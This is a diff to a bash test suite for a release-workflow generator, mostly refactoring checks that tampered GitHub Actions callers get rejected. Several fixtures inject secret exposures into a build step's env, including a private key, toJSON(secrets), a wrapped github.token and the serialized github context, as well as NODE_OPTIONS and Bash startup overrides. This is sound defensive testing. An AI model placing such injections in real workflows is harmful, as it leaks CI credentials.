+expect_rejection --reason 'does not declare valid package directories in generator provenance (#1717)' \
+  --pass "the generated suite binds provenance to canonical package-directory inputs" \
+  --fail "altered generator provenance was rejected for another reason" \
+  "generator provenance changes the contract-pinned package set (#1717)" drift_generator_provenance_only '--only-package-dir compat'
 while IFS= read -r package_directory_options; do
-  expect_rejection "generator provenance alone uses an unsafe or duplicate package directory: $package_directory_options (#1717)" \
-    drift_generator_provenance_only "$package_directory_options"
-sync_last_rejection
-  grep -qF 'does not declare valid package directories in generator provenance (#1717)' "$tmproot/run.out" \
-    && pass "the generated suite rejects unsafe provenance independently of workflow stamps" \
-    || fail "unsafe provenance was rejected for another reason: $(tail -2 "$tmproot/run.out")"
+  expect_rejection --reason 'does not declare valid package directories in generator provenance (#1717)' \
+    --pass "the generated suite rejects unsafe provenance independently of workflow stamps" \
+    --fail "unsafe provenance was rejected for another reason" \
+    "generator provenance alone uses an unsafe or duplicate package directory: $package_directory_options (#1717)" drift_generator_provenance_only "$package_directory_options"
 done <<'EOF'
 --package-dir ../compat
 --only-package-dir compat --only-package-dir compat
@@ -5411,82 +5400,70 @@ expect_release_mode_rejection release-snapshot \
   "a release-snapshot release-plan step injects PYTHONPATH (#1717)" \
   add_precredential_pythonpath \
   'contains an unapproved verify step before credentialed dependency installation (#1717)'
-expect_rejection "credentialed dependency install preloads repository Node code (#1717)" \
-  add_install_node_options
-sync_last_rejection
-grep -qF 'does not allowlist the credentialed dependency installation environment (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite rejects NODE_OPTIONS during credentialed installation" \
-  || fail "a credentialed NODE_OPTIONS mutation was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "release verifier overrides npm script shell (#1717)" replace_verification_script_shell
-sync_last_rejection
-grep -qF 'does not isolate release verification from prior lifecycle environment (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite rejects an npm script-shell override" \
-  || fail "an npm script-shell override was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "release verifier inherits Bash startup script (#1717)" replace_verification_bash_env
-sync_last_rejection
-grep -qF 'does not isolate release verification from prior lifecycle environment (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite rejects a Bash startup script override" \
-  || fail "a Bash startup script override was rejected for another reason: $(tail -2 "$tmproot/run.out")"
+expect_rejection --reason 'does not allowlist the credentialed dependency installation environment (#1717)' \
+  --pass "the generated suite rejects NODE_OPTIONS during credentialed installation" \
+  --fail "a credentialed NODE_OPTIONS mutation was rejected for another reason" \
+  "credentialed dependency install preloads repository Node code (#1717)" add_install_node_options
+expect_rejection --reason 'does not isolate release verification from prior lifecycle environment (#1717)' \
+  --pass "the generated suite rejects an npm script-shell override" \
+  --fail "an npm script-shell override was rejected for another reason" \
+  "release verifier overrides npm script shell (#1717)" replace_verification_script_shell
+expect_rejection --reason 'does not isolate release verification from prior lifecycle environment (#1717)' \
+  --pass "the generated suite rejects a Bash startup script override" \
+  --fail "a Bash startup script override was rejected for another reason" \
+  "release verifier inherits Bash startup script (#1717)" replace_verification_bash_env
 # The retention window reaches the verification hook only through the pinned
 # step env and the pinned run_clean allowlist; each must fail on its own.
-expect_rejection "release verifier without the retention window" \
-  edit_verification_retention_window drop-env
-sync_last_rejection
-grep -qF 'does not isolate release verification from prior lifecycle environment (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite rejects a verify step without the retention window" \
-  || fail "a dropped retention window was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "release verifier with a different retention default" \
-  edit_verification_retention_window redefault
-sync_last_rejection
-grep -qF 'does not isolate release verification from prior lifecycle environment (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite rejects a retention default the retention jobs do not use" \
-  || fail "a re-defaulted retention window was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "release verifier that withholds the retention window from the hook" \
-  edit_verification_retention_window drop-forward
-sync_last_rejection
-grep -qF 'does not match the approved release verification script (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite rejects a clean environment that withholds the retention window" \
-  || fail "a withheld retention window was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "stamped-version warning text shadowed outside generated header (#862)" shadow_stamped_version_header
-sync_last_rejection
-grep -qF 'does not carry the stamped-version warning inside the generated header before `on:` (#862)' "$tmproot/run.out" \
-  && pass "the shadowed warning is rejected for leaving generated header" \
-  || fail "the shadowed warning failed for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "a modified release-verification failure diagnostic (#1717)" noop_stamped_version_diagnostic
-sync_last_rejection
-grep -qF 'does not match the approved release verification script (#1717)' "$tmproot/run.out" \
-  && pass "the generated suite rejects a changed verification script by its approved-script pin" \
-  || fail "the changed verification script was rejected for another reason: $(tail -2 "$tmproot/run.out")"
-expect_rejection "an unrelated release step exposed to private-package auth (#569)" expose_private_token_to_unrelated_step
-expect_rejection "a release caller reachable by a push to main" add_push_trigger
-expect_rejection "a release caller on a mutable reusable ref" unpin_release_ref
-expect_rejection "a release caller whose contract_ref drifts from its uses pin" drift_release_contract_ref
-expect_rejection "a release caller whose Node version became Renovate-visible" expose_node_version_to_renovate
-expect_rejection "a hand-written release caller with no generator provenance" strip_release_provenance
-expect_rejection "a push: trigger hidden in a flow-style on:" add_flow_style_push_trigger
+expect_rejection --reason 'does not isolate release verification from prior lifecycle environment (#1717)' \
+  --pass "the generated suite rejects a verify step without the retention window" \
+  --fail "a dropped retention window was rejected for another reason" \
+  "release verifier without the retention window" edit_verification_retention_window drop-env
+expect_rejection --reason 'does not isolate release verification from prior lifecycle environment (#1717)' \
+  --pass "the generated suite rejects a retention default the retention jobs do not use" \
+  --fail "a re-defaulted retention window was rejected for another reason" \
+  "release verifier with a different retention default" edit_verification_retention_window redefault
+expect_rejection --reason 'does not match the approved release verification script (#1717)' \
+  --pass "the generated suite rejects a clean environment that withholds the retention window" \
+  --fail "a withheld retention window was rejected for another reason" \
+  "release verifier that withholds the retention window from the hook" edit_verification_retention_window drop-forward
+expect_rejection --reason 'does not carry the stamped-version warning inside the generated header before `on:` (#862)' \
+  --pass "the shadowed warning is rejected for leaving generated header" \
+  --fail "the shadowed warning failed for another reason" \
+  "stamped-version warning text shadowed outside generated header (#862)" shadow_stamped_version_header
+expect_rejection --reason 'does not match the approved release verification script (#1717)' \
+  --pass "the generated suite rejects a changed verification script by its approved-script pin" \
+  --fail "the changed verification script was rejected for another reason" \
+  "a modified release-verification failure diagnostic (#1717)" noop_stamped_version_diagnostic
+expect_rejection --reason "exposes a GitHub or package secret beyond approved acquisition and restart-safe state" "an unrelated release step exposed to private-package auth (#569)" expose_private_token_to_unrelated_step
+expect_rejection --reason "has an ambiguous or malformed top-level trigger mapping: workflow_dispatch input schema" "a release caller reachable by a push to main" add_push_trigger
+expect_rejection --reason "does not call the release workflow at the pin" "a release caller on a mutable reusable ref" unpin_release_ref
+expect_rejection --reason "passes a contract_ref that differs from its changelog-release.yml pin" "a release caller whose contract_ref drifts from its uses pin" drift_release_contract_ref
+expect_rejection --reason "does not use Node 24 consistently" "a release caller whose Node version became Renovate-visible" expose_node_version_to_renovate
+expect_rejection --reason ".github/workflows/release.yml declares 0 generator-mode headers" "a hand-written release caller with no generator provenance" strip_release_provenance
+expect_rejection --reason "has an ambiguous or malformed top-level trigger mapping: trigger mapping must use" "a push: trigger hidden in a flow-style on:" add_flow_style_push_trigger
 for equivalent in on '"on"' true True TRUE yes Yes YES; do
-  expect_rejection "a duplicate YAML-equivalent $equivalent trigger key (#1070)" \
+  expect_rejection --reason "has an ambiguous or malformed top-level trigger mapping: duplicate YAML-equivalent" "a duplicate YAML-equivalent $equivalent trigger key (#1070)" \
     duplicate_equivalent_trigger "$equivalent"
 done
-expect_rejection "an aliased release trigger mapping (#1070)" add_trigger_alias
-expect_rejection "a merged release trigger mapping (#1070)" add_trigger_merge_key
-expect_rejection "duplicate quoted and plain workflow_dispatch keys (#1070)" duplicate_dispatch_trigger
-expect_rejection "a workflow_dispatch value alias (#1070)" alias_dispatch_schema
-expect_rejection "an anchored workflow_dispatch mapping (#1070)" anchor_dispatch_schema
-expect_rejection "a flow-style workflow_dispatch input mapping (#1070)" flow_dispatch_schema
-expect_rejection "an explicitly tagged workflow_dispatch mapping (#1070)" tag_dispatch_schema
-expect_rejection "a duplicate nested dispatch input key (#1070)" duplicate_nested_input_key
-expect_rejection "an unexpected dispatch input (#1070)" add_unknown_dispatch_input
-expect_rejection "a changed required dispatch-input shape (#1070)" change_dispatch_input_shape
-expect_rejection "a YAML directive (#1070)" add_yaml_directive
-expect_rejection "a second YAML document (#1070)" add_second_yaml_document
-expect_rejection "malformed nested trigger indentation (#1070)" malform_nested_trigger_indent
-expect_rejection "a scalar changed through a trailing comment (#1070)" add_trigger_scalar_comment
-expect_rejection "a malformed top-level release trigger mapping (#1070)" malform_trigger_mapping
-expect_rejection "a release caller exposed as a reusable workflow_call" add_workflow_call_trigger
-expect_rejection "a release caller fired by a release: event" add_release_trigger
-expect_rejection "an install credential inherited from a job-level env:" install_token_from_job_env
-expect_rejection "a release caller under any other filename (#463, #464)" rename_release_caller
+expect_rejection --reason "uses YAML the release-shape check cannot read: a YAML tag, anchor or alias" "an aliased release trigger mapping (#1070)" add_trigger_alias
+expect_rejection --reason "uses YAML the release-shape check cannot read: a YAML tag, anchor or alias" "a merged release trigger mapping (#1070)" add_trigger_merge_key
+expect_rejection --reason "has an ambiguous or malformed top-level trigger mapping: workflow_dispatch input schema" "duplicate quoted and plain workflow_dispatch keys (#1070)" duplicate_dispatch_trigger
+expect_rejection --reason "uses YAML the release-shape check cannot read: a YAML tag, anchor or alias" "a workflow_dispatch value alias (#1070)" alias_dispatch_schema
+expect_rejection --reason "uses YAML the release-shape check cannot read: a YAML tag, anchor or alias" "an anchored workflow_dispatch mapping (#1070)" anchor_dispatch_schema
+expect_rejection --reason "has an ambiguous or malformed top-level trigger mapping: workflow_dispatch input schema" "a flow-style workflow_dispatch input mapping (#1070)" flow_dispatch_schema
+expect_rejection --reason "uses YAML the release-shape check cannot read: a YAML tag, anchor or alias" "an explicitly tagged workflow_dispatch mapping (#1070)" tag_dispatch_schema
+expect_rejection --reason "has an ambiguous or malformed top-level trigger mapping: workflow_dispatch input schema" "a duplicate nested dispatch input key (#1070)" duplicate_nested_input_key
+expect_rejection --reason "has an ambiguous or malformed top-level trigger mapping: workflow_dispatch input schema" "an unexpected dispatch input (#1070)" add_unknown_dispatch_input
+expect_rejection --reason "has an ambiguous or malformed top-level trigger mapping: workflow_dispatch input schema" "a changed required dispatch-input shape (#1070)" change_dispatch_input_shape
+expect_rejection --reason "uses YAML the release-shape check cannot read: a YAML document marker or directive at" "a YAML directive (#1070)" add_yaml_directive
+expect_rejection --reason "uses YAML the release-shape check cannot read: a YAML document marker or directive at" "a second YAML document (#1070)" add_second_yaml_document
+expect_rejection --reason "has an ambiguous or malformed top-level trigger mapping: workflow_dispatch input schema" "malformed nested trigger indentation (#1070)" malform_nested_trigger_indent
+expect_rejection --reason "has an ambiguous or malformed top-level trigger mapping: workflow_dispatch input schema" "a scalar changed through a trailing comment (#1070)" add_trigger_scalar_comment
+expect_rejection --reason "has an ambiguous or malformed top-level trigger mapping: malformed mapping entry" "a malformed top-level release trigger mapping (#1070)" malform_trigger_mapping
+expect_rejection --reason "has an ambiguous or malformed top-level trigger mapping: workflow_dispatch input schema" "a release caller exposed as a reusable workflow_call" add_workflow_call_trigger
+expect_rejection --reason "has an ambiguous or malformed top-level trigger mapping: workflow_dispatch input schema" "a release caller fired by a release: event" add_release_trigger
+expect_rejection --reason "does not pass the private-dependency token to node-release.yml" "an install credential inherited from a job-level env:" install_token_from_job_env
+expect_rejection --reason "has no pinned package-directory selection" "a release caller under any other filename (#463, #464)" rename_release_caller
 
 # ...and the renamed caller must be rejected for its real defect, not merely for
 # no longer being called release.yml. A checker that only notices the name would
@@ -5677,13 +5654,16 @@ expect_backlink_rejection() {
   cp "$refs_adopter/NEXT/2026-08-03-issue-5-refs.md" "$dir/NEXT/"
   commit_fixture "$dir" backlink
   corrupt_render "$dir" "$2"
-  if run_adopter "$dir"; then
-    fail "emitted suite accepted $label"
-  elif grep -q 'back-link missing from the rendered log' "$tmproot/run.out"; then
-    pass "emitted suite rejects $label"
-  else
-    fail "$label failed for another reason: $(tail -2 "$tmproot/run.out")"
-  fi
+  schedule_adopter_script "$dir" "$(cat <<'SCHED_SCRIPT'
+if [ "$status" -eq 0 ]; then
+  fail "emitted suite accepted $label"
+elif grep -q 'back-link missing from the rendered log' "$ADOPTER_LOG"; then
+  pass "emitted suite rejects $label"
+else
+  fail "$label failed for another reason: $(tail -2 "$ADOPTER_LOG")"
+fi
+SCHED_SCRIPT
+)"
 }
 
 expect_backlink_rejection "a rendered back-link naming the wrong issue" 's/issue #5;/issue #55;/'
@@ -5764,10 +5744,19 @@ fi
 
 # Still a renderer, not a front end to a pinned engine: anything else is refused
 # so a caller cannot reach subcommands the contract does not sanction.
-if (cd "$quoted" && ./scripts/render-next.sh release --version v9.9.9) >/dev/null 2>&1; then
+# Forwarded, the engine's own argument parser would refuse it too, so only the
+# renderer's exit 2 and its own line show the renderer refused it.
+renderer_refusal_err="$tmproot/renderer-refusal.err"
+renderer_refusal_status=0
+(cd "$quoted" && ./scripts/render-next.sh release --version v9.9.9) >/dev/null 2>"$renderer_refusal_err" \
+  || renderer_refusal_status=$?
+if [ "$renderer_refusal_status" -eq 0 ]; then
   fail "the generated renderer forwarded an unsanctioned argument"
-else
+elif [ "$renderer_refusal_status" -eq 2 ] \
+  && [ "$(cat "$renderer_refusal_err")" = "render-next: unexpected argument 'release'" ]; then
   pass "the generated renderer still refuses arguments outside its render flags"
+else
+  fail "the generated renderer's refusal of an unsanctioned argument is not its own (exit $renderer_refusal_status): $(head -c 300 "$renderer_refusal_err" | tr '\n' ' ')"
 fi
 
 # Only reachable after a release, so it needs a released fixture.
@@ -5776,11 +5765,9 @@ build_adopter "$edited"
 python3 "$contract_src" release --repo-root "$edited" --version v1.0.0 >/dev/null 2>&1
 printf '\nhand-written addition\n' >>"$edited/CHANGELOG.md"
 schedule_adopter_script "$edited" "$(cat <<'SCHED_SCRIPT'
-if [ "$status" -eq 0 ]; then
-  fail "emitted suite accepted a hand-edited CHANGELOG.md"
-else
-  pass "emitted suite rejects a hand-edited CHANGELOG.md"
-fi
+expect_scheduled_rejection 'CHANGELOG.md was hand-edited; it must equal the rendered released snapshots' \
+  "emitted suite rejects a hand-edited CHANGELOG.md" \
+  "emitted suite accepted a hand-edited CHANGELOG.md"
 SCHED_SCRIPT
 )"
 
@@ -5801,23 +5788,22 @@ rm -f "$gen_err"
 # GitHub Release assets (e.g. Electron installers) instead of a package.
 # --------------------------------------------------------------------------
 
-if bash "$gen" release-artifact "$sha" >/dev/null 2>&1; then
-  fail "release-artifact accepted generation with no --build-runner"
-else
-  pass "release-artifact requires at least one --build-runner"
-fi
+expect_generator_refusal 'release-artifact requires at least one --build-runner' \
+  "release-artifact requires at least one --build-runner" \
+  "release-artifact accepted generation with no --build-runner" \
+  release-artifact "$sha"
 
-if bash "$gen" release-artifact "$sha" --build-runner 'not a label' >/dev/null 2>&1; then
-  fail "release-artifact accepted a --build-runner value that is not a bare label"
-else
-  pass "release-artifact rejects a --build-runner value that is not a bare label"
-fi
+# One message covers every runner selector the check refuses.
+build_runner_refusal='--build-runner must be a literal label or an exact ADR 0103 fromJSON(vars.CI_LANE_TRUSTED_MACOS|WINDOWS) expression'
+expect_generator_refusal "$build_runner_refusal" \
+  "release-artifact rejects a --build-runner value that is not a bare label" \
+  "release-artifact accepted a --build-runner value that is not a bare label" \
+  release-artifact "$sha" --build-runner 'not a label'
 
-if bash "$gen" release-artifact "$sha" --build-runner 'vars.CI_LANE_TRUSTED_MACOS' >/dev/null 2>&1; then
-  fail "release-artifact accepted a silent variable-name runner literal"
-else
-  pass "release-artifact rejects variable names that omit the required expression"
-fi
+expect_generator_refusal "$build_runner_refusal" \
+  "release-artifact rejects variable names that omit the required expression" \
+  "release-artifact accepted a silent variable-name runner literal" \
+  release-artifact "$sha" --build-runner 'vars.CI_LANE_TRUSTED_MACOS'
 
 lane_expression='${{ fromJSON(vars.CI_LANE_TRUSTED_MACOS) }}'
 windows_lane_expression='${{ fromJSON(vars.CI_LANE_TRUSTED_WINDOWS) }}'
@@ -5827,11 +5813,10 @@ else
   fail "release-artifact rejected the exact ADR 0103 macOS lane expression"
 fi
 for forbidden_metered_literal in macos-14 windows-2022; do
-  if bash "$gen" release-artifact "$sha" --build-runner "$forbidden_metered_literal" >/dev/null 2>&1; then
-    fail "release-artifact accepted literal metered selector: $forbidden_metered_literal"
-  else
-    pass "release-artifact rejects literal metered selector: $forbidden_metered_literal"
-  fi
+  expect_generator_refusal "$build_runner_refusal" \
+    "release-artifact rejects literal metered selector: $forbidden_metered_literal" \
+    "release-artifact accepted literal metered selector: $forbidden_metered_literal" \
+    release-artifact "$sha" --build-runner "$forbidden_metered_literal"
 done
 
 if bash "$gen" release-artifact "$sha" --build-runner ubuntu-24.04 --node-version 22 \
@@ -5841,41 +5826,34 @@ else
   fail "release-artifact rejected a validated --node-version"
 fi
 
-if bash "$gen" release-node "$sha" --build-runner ubuntu-24.04 >/dev/null 2>&1; then
-  fail "release-node accepted --build-runner, a release-artifact-only flag"
-else
-  pass "release-node rejects --build-runner"
-fi
+expect_generator_refusal '--build-runner is accepted only by release-artifact and contract-test' \
+  "release-node rejects --build-runner" \
+  "release-node accepted --build-runner, a release-artifact-only flag" \
+  release-node "$sha" --build-runner ubuntu-24.04
 
-if bash "$gen" release-node "$sha" --approved-internal-package @verjson/ai >/dev/null 2>&1; then
-  fail "release-node accepted release-artifact private acquisition policy"
-else
-  pass "private acquisition policy is release-artifact-only"
-fi
+expect_generator_refusal '--approved-internal-package is accepted only by release-artifact and contract-test' \
+  "private acquisition policy is release-artifact-only" \
+  "release-node accepted release-artifact private acquisition policy" \
+  release-node "$sha" --approved-internal-package @verjson/ai
 for invalid_package in '@Verjson/ai' '@verjson/AI' '@other/ai' '@verjson/ai@latest'; do
-  if bash "$gen" release-artifact "$sha" --build-runner ubuntu-24.04 \
-      --approved-internal-package "$invalid_package" >/dev/null 2>&1; then
-    fail "release-artifact accepted invalid approved package: $invalid_package"
-  else
-    pass "release-artifact rejects invalid approved package: $invalid_package"
-  fi
+  expect_generator_refusal '--approved-internal-package must be an exact lowercase @verjson package name' \
+    "release-artifact rejects invalid approved package: $invalid_package" \
+    "release-artifact accepted invalid approved package: $invalid_package" \
+    release-artifact "$sha" --build-runner ubuntu-24.04 --approved-internal-package "$invalid_package"
 done
 
 artifact_release="$(bash "$gen" release-artifact "$sha" \
   --build-runner ubuntu-24.04 --build-runner self-hosted-release)"
 
-sync_last_rejection
 grep -qF "gen-changelog-caller.sh release-artifact $sha --build-runner ubuntu-24.04 --build-runner self-hosted-release" \
   <<<"$artifact_release" \
   && pass "release-artifact records its exact regeneration command, including build runners" \
   || fail "release-artifact does not record a regenerable provenance comment"
-sync_last_rejection
 grep -qE '^  build:$' <<<"$artifact_release" \
   && grep -qE '^  publish:$' <<<"$artifact_release" \
   && ! grep -q 'uses:.*node-release\.yml' <<<"$artifact_release" \
   && pass "release-artifact replaces node-release.yml with a build+publish pair" \
   || fail "release-artifact did not emit the expected build/publish shape"
-sync_last_rejection
 grep -qF -- "- os: 'ubuntu-24.04'" <<<"$artifact_release" \
   && grep -qF -- "- os: 'self-hosted-release'" <<<"$artifact_release" \
   && pass "release-artifact's build matrix carries exactly the declared runner labels" \
@@ -5884,7 +5862,6 @@ grep -qF -- "- os: 'ubuntu-24.04'" <<<"$artifact_release" \
 private_artifact_release="$(bash "$gen" release-artifact "$sha" \
   --build-runner "$lane_expression" --build-runner "$windows_lane_expression" \
   --approved-internal-package @verjson/ai --approved-internal-package @verjson/ai-gguf)"
-sync_last_rejection
 grep -qF 'acquire-private-dependencies:' <<<"$private_artifact_release" \
   && grep -qF 'permissions:' <<<"$private_artifact_release" \
   && grep -qF 'packages: read' <<<"$private_artifact_release" \
@@ -5989,11 +5966,9 @@ assert source.count(binding) == 1
 path.write_text(source.replace(binding, "    # runs-on: ${{ matrix.os }}\n    runs-on: 'general'", 1))
 PY
 schedule_adopter_script "$unbound_build_adopter" "$(cat <<'SCHED_SCRIPT'
-if [ "$status" -eq 0 ]; then
-  fail "emitted suite accepts a build job detached from its approved OS matrix"
-else
-  pass "emitted suite rejects a build job detached from its approved OS matrix"
-fi
+expect_scheduled_rejection 'release.yml build job does not run on its approved OS matrix' \
+  "emitted suite rejects a build job detached from its approved OS matrix" \
+  "emitted suite accepts a build job detached from its approved OS matrix"
 SCHED_SCRIPT
 )"
 
@@ -6009,11 +5984,12 @@ binding = '    runs-on: ${{ matrix.os }}'
 assert source.count(binding) == 2
 path.write_text(source.replace(binding, "    # runs-on: ${{ matrix.os }}\n    runs-on: 'general'", 1))
 PY
-if run_adopter "$unbound_acquisition_adopter"; then
-  fail "emitted suite accepts acquisition detached from its approved OS matrix"
-else
-  pass "emitted suite rejects acquisition detached from its approved OS matrix"
-fi
+schedule_adopter_script "$unbound_acquisition_adopter" "$(cat <<'SCHED_SCRIPT'
+expect_scheduled_rejection 'release.yml acquisition job does not run on its approved OS matrix' \
+  "emitted suite rejects acquisition detached from its approved OS matrix" \
+  "emitted suite accepts acquisition detached from its approved OS matrix"
+SCHED_SCRIPT
+)"
 
 sync_last_rejection
 if python3 "$repo_root/scripts/ci-gate/hosted-selector-policy.py" \
@@ -6806,7 +6782,6 @@ cp -a "$artifact_adopter" "$leaked_secret_adopter"
 sed -i \
   's/RELEASE_VERSION: \${{ needs.verify.outputs.version }}/RELEASE_VERSION: ${{ needs.verify.outputs.version }}\n          RELEASE_APP_PRIVATE_KEY: ${{ secrets.RELEASE_APP_PRIVATE_KEY }}/' \
   "$leaked_secret_adopter/.github/workflows/release.yml"
-sync_last_rejection
 grep -qF 'RELEASE_APP_PRIVATE_KEY: ${{ secrets.RELEASE_APP_PRIVATE_KEY }}' \
   "$leaked_secret_adopter/.github/workflows/release.yml" \
   || fail "test setup did not actually inject RELEASE_APP_PRIVATE_KEY into the build step's env"
@@ -6833,7 +6808,6 @@ cp -a "$artifact_adopter" "$bracket_secret_adopter"
 sed -i \
   "s/RELEASE_VERSION: \${{ needs.verify.outputs.version }}/RELEASE_VERSION: \${{ needs.verify.outputs.version }}\n          RELEASE_APP_PRIVATE_KEY: \${{ secrets['RELEASE_APP_PRIVATE_KEY'] }}/" \
   "$bracket_secret_adopter/.github/workflows/release.yml"
-sync_last_rejection
 grep -qF "RELEASE_APP_PRIVATE_KEY: \${{ secrets['RELEASE_APP_PRIVATE_KEY'] }}" \
   "$bracket_secret_adopter/.github/workflows/release.yml" \
   || fail "test setup did not actually inject a bracket-syntax secrets[...] reference into the build step's env"
@@ -6854,7 +6828,6 @@ cp -a "$artifact_adopter" "$tojson_secret_adopter"
 sed -i \
   's/RELEASE_VERSION: \${{ needs.verify.outputs.version }}/RELEASE_VERSION: ${{ needs.verify.outputs.version }}\n          ALL_SECRETS: ${{ toJSON(secrets) }}/' \
   "$tojson_secret_adopter/.github/workflows/release.yml"
-sync_last_rejection
 grep -qF 'ALL_SECRETS: ${{ toJSON(secrets) }}' \
   "$tojson_secret_adopter/.github/workflows/release.yml" \
   || fail "test setup did not actually inject a toJSON(secrets) dump into the build step's env"
@@ -6887,7 +6860,6 @@ replacement = needle + "          PRIVATE_GITHUB_TOKEN: ${{ format('{{{0}}}', gi
 text = text[:token_index] + replacement + text[token_index + len(needle):]
 open(path, "w", encoding="utf-8").write(text)
 PY
-sync_last_rejection
 grep -qF "PRIVATE_GITHUB_TOKEN: \${{ format('{{{0}}}', github.token) }}" \
   "$github_token_build_adopter/.github/workflows/release.yml" \
   || fail "test setup did not inject a wrapped github.token into the release-artifact build job"
@@ -6920,7 +6892,6 @@ replacement = needle + "          PRIVATE_GITHUB_CONTEXT: ${{ toJSON(github) }}\
 text = text[:token_index] + replacement + text[token_index + len(needle):]
 open(path, "w", encoding="utf-8").write(text)
 PY
-sync_last_rejection
 grep -qF 'PRIVATE_GITHUB_CONTEXT: ${{ toJSON(github) }}' \
   "$github_context_build_adopter/.github/workflows/release.yml" \
   || fail "test setup did not inject a serialized github context into the release-artifact build job"
@@ -6953,10 +6924,8 @@ mv "$toplevel_env_secret_adopter/.github/workflows/release.yml.new" \
 sed -i \
   's/RELEASE_VERSION: \${{ needs.verify.outputs.version }}/RELEASE_VERSION: ${{ needs.verify.outputs.version }}\n          RELEASE_APP_PRIVATE_KEY: ${{ env.RELEASE_APP_PRIVATE_KEY }}/' \
   "$toplevel_env_secret_adopter/.github/workflows/release.yml"
-sync_last_rejection
 grep -qE '^env:[[:space:]]*$' "$toplevel_env_secret_adopter/.github/workflows/release.yml" \
   || fail "test setup did not actually add a workflow-level env: block"
-sync_last_rejection
 grep -qF 'RELEASE_APP_PRIVATE_KEY: ${{ env.RELEASE_APP_PRIVATE_KEY }}' \
   "$toplevel_env_secret_adopter/.github/workflows/release.yml" \
   || fail "test setup did not actually make the build step consume the workflow-level env indirection"
@@ -6997,22 +6966,18 @@ SCHED_SCRIPT
 snapshot_release="$(bash "$gen" release-snapshot "$sha")"
 release_auth_environment_note='# The step clears shell startup, loader, and Git settings that could alter this lookup.'
 release_auth_isolation_note='# Run Git with env -i and send its auth header over stdin; do not export it.'
-sync_last_rejection
 grep -qF -- "$release_auth_environment_note" <<<"$release_node_workflow" \
   && grep -qF -- "$release_auth_isolation_note" <<<"$release_node_workflow" \
   && pass "release-node documents its isolated release-state Git environment (#1715)" \
   || fail "release-node omits the release-state environment explanation (#1715)"
-sync_last_rejection
 grep -qF -- "$release_auth_environment_note" <<<"$artifact_release" \
   && grep -qF -- "$release_auth_isolation_note" <<<"$artifact_release" \
   && pass "release-artifact documents its isolated release-state Git environment (#1715)" \
   || fail "release-artifact omits the release-state environment explanation (#1715)"
-sync_last_rejection
 grep -qF -- "$release_auth_environment_note" <<<"$snapshot_release" \
   && grep -qF -- "$release_auth_isolation_note" <<<"$snapshot_release" \
   && pass "release-snapshot documents its isolated release-state Git environment (#1715)" \
   || fail "release-snapshot omits the release-state environment explanation (#1715)"
-sync_last_rejection
 grep -qE '^  verify:$' <<<"$snapshot_release" \
   && grep -qE '^  snapshot:$' <<<"$snapshot_release" \
   && grep -qE '^  publish:$' <<<"$snapshot_release" \
@@ -7036,7 +7001,6 @@ snapshot_verify_job="$(awk '/^  verify:[[:space:]]*$/{seen=1} /^  snapshot:[[:sp
   && pass "release-snapshot guards setup-node, dependency acquisition and installation, lifecycle execution, and version stamping on package.json and fails closed without a verify hook (#1206)" \
   || fail "release-snapshot still assumes a Node project: a non-npm adopter would fail at npm ci or verify nothing"
 snapshot_publish_job="$(awk '/^  publish:[[:space:]]*$/{seen=1} seen' <<<"$snapshot_release")"
-sync_last_rejection
 grep -qF 'VERSION: ${{ needs.verify.outputs.version }}' <<<"$snapshot_publish_job" \
   && ! grep -qF 'steps.release-version' <<<"$snapshot_publish_job" \
   && pass "release-snapshot publish job resolves VERSION from needs.verify, not the unreachable verify-job step" \
@@ -7089,7 +7053,6 @@ assert_release_path_mutation_rejected "$snapshot_adopter" release-snapshot snaps
   move_capture_after_lifecycle_scripts 'does not capture trusted release verification runtime inputs (#1717)'
 
 expected_release_fallback='    fail "$release_workflow is not a generated release caller at $CONTRACT_REF. Inspect the existing release workflow and repository configuration to determine its mode and all custom generator options. Regenerate the complete caller set at $CONTRACT_REF in a clean temporary checkout, review the full diff, then replace the committed set together. Supported release modes are release-node, release-artifact for GitHub Release assets, and release-snapshot when the release workflow publishes nothing."'
-sync_last_rejection
 grep -Fqx "$expected_release_fallback" "$emitted" \
   && pass "release-specific unknown-provenance fallback is prose-only" \
   || fail "release-specific unknown-provenance fallback diverged or included an unapproved command"
@@ -7181,11 +7144,9 @@ end = next(
 open(path, "w", encoding="utf-8").writelines(lines[:start] + lines[end:])
 PY
 schedule_adopter_script "$stripped_guard_adopter" "$(cat <<'SCHED_SCRIPT'
-if [ "$status" -eq 0 ]; then
-  fail "emitted suite accepted a release-node caller with its pre-snapshot refusal deleted"
-else
-  pass "emitted suite rejects a release-node caller whose pre-snapshot refusal was deleted (#1206)"
-fi
+expect_scheduled_rejection 'release.yml does not refuse a private, unpublishable package before the snapshot is tagged (#1206)' \
+  "emitted suite rejects a release-node caller whose pre-snapshot refusal was deleted (#1206)" \
+  "emitted suite accepted a release-node caller with its pre-snapshot refusal deleted"
 SCHED_SCRIPT
 )"
 
@@ -7234,15 +7195,18 @@ expect_set_divergence_named() {
   dir="$tmproot/set-atomicity-$set_atomicity_seq"
   build_adopter "$dir" yes "$caller"
   stale_pin "$dir" "$member"
-  if run_adopter "$dir"; then
-    fail "emitted suite accepted a set with $member left at an earlier contract commit"
-    return
-  fi
-  grep -qF "$member" "$tmproot/run.out" \
-    && grep -qF "$stale_contract_ref" "$tmproot/run.out" \
-    && grep -qF "$sha" "$tmproot/run.out" \
+  schedule_adopter_script "$dir" "$(cat <<'SCHED_SCRIPT'
+if [ "$status" -eq 0 ]; then
+  fail "emitted suite accepted a set with $member left at an earlier contract commit"
+else
+  grep -qF "$member" "$ADOPTER_LOG" \
+    && grep -qF "$stale_contract_ref" "$ADOPTER_LOG" \
+    && grep -qF "$sha" "$ADOPTER_LOG" \
     && pass "a subset regeneration naming $member reports both contract commits" \
-    || fail "rejecting $member did not name the member and both commits: $(tr '\n' ' ' <"$tmproot/run.out" | tail -c 400)"
+    || fail "rejecting $member did not name the member and both commits: $(tr '\n' ' ' <"$ADOPTER_LOG" | tail -c 400)"
+fi
+SCHED_SCRIPT
+)"
 }
